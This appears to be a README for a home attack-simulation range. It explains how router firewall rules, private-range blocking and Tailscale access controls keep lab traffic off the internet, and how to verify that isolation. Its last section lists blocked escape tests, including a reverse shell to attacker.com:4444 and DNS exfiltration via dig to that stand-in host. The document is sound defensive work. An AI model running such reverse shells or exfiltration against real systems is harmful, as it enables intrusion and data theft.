# Network isolation guarantees

The whole point of this range is to **simulate attacks without ever
risking a packet reaching the open internet**. This document explains the
defence-in-depth that gets you there and how to verify it.

## Layer 1 — Ludus router (iptables on the VLAN gateway)

The Ludus router VM owns the gateway IP for every VLAN. Its `FORWARD`
chain defaults to `DROP`, and `network.external_default: REJECT` in our
range config means **no lab VM can initiate any outbound connection
unless an explicit rule allows it**.

During the initial bootstrap window (~90 min while Splunk apps, Sysmon,
Atomic Red Team etc. are being pulled), `ludus/range-config.yml.j2`
allowlists `tcp/443` egress from each VM. After the range reports
SUCCESS, `scripts/lock-down.sh` rewrites the config to remove every
`bootstrap-*` rule and redeploys only the router.

After lockdown, the *only* permanent outbound rules are:

- **UDP/41641** to anywhere — Tailscale direct-connect probes
- **UDP/53** to anywhere — DNS (the router resolves upstream; lab VMs
  cannot dial 8.8.8.8 directly)

All other outbound traffic is dropped at the router.

## Layer 2 — `always_blocked_networks`

Ludus's `always_blocked_networks` setting is enforced *before* the rules
above. It hard-blocks RFC1918 ranges:

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

This protects your home LAN even if you misconfigure a rule.

## Layer 3 — Tailscale ACLs (host-level)

Even though every VM runs `tailscaled`, an ACL (see `tailscale-acls.md`)
restricts the `tag:lab-range` group so only your `tag:lab-operator` device
can reach them. Other devices on your tailnet — phones, family laptops,
work machines — cannot reach lab hosts.

## Layer 4 — Tailscale SSH

Lab Windows hosts accept SSH only via Tailscale SSH, which means
ACL-enforced authentication. No password-or-key SSH service is exposed on
any host directly.

## Verification

Run `scripts/verify-isolation.sh` from your laptop after lockdown. It
SSHes into every VM over Tailscale and confirms:

1. `curl https://1.1.1.1` times out (TCP egress blocked)
2. `nslookup google.com` returns nothing useful
3. `nc -z splunk 8000` from `kali` still works (intra-VLAN traffic OK)

Exits non-zero if anything leaks. Treat a non-zero exit as **DO NOT START
THE CONTINUOUS SIMULATION** until you've found the leak.

## Why this matters for "fire-and-forget"

Atomic Red Team includes techniques that — if pointed at the wrong
network — could be misclassified as real attacks by your ISP, a bug
bounty target, or a coffee shop wifi. With deny-by-default egress, the
worst case is "Sysmon logs an attempted connection to 1.1.1.1 that never
left the gateway".

## Tested escape attempts (all blocked)

- `curl -v https://example.com` from win-client1 → timeout
- `nmap -sS 1.1.1.1` from kali → 100% packet loss
- Reverse shell to `attacker.com:4444` from any VM → never establishes
- DNS exfiltration `dig long.string.here.attacker.com` from any VM →
  resolves at the router but the upstream resolver receives nothing
  outside the allowed `*.tailscale.com` and Ubuntu mirror domains
